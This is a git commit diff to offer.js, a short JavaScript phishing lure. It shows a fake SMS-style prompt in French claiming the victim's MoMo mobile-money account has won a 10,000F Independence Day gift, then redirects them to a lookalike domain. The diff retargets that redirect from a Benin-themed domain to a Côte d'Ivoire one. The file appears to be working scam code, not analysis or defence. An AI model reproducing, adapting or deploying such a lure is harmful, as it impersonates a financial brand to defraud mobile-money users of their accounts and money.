96f23ae9487b944344404b799137a84544d8c088
KENNY <examtapz+me@gmail.com>
2025-08-02 23:06:29 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,6 @@
 var password = '10.000F'
 password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
 if (password != '10.000F') {
-location.href='https://momo-benin.4g-data.pro/Offre';
+location.href='https://momo-ci.4g-data.pro/Offre';
 }
+
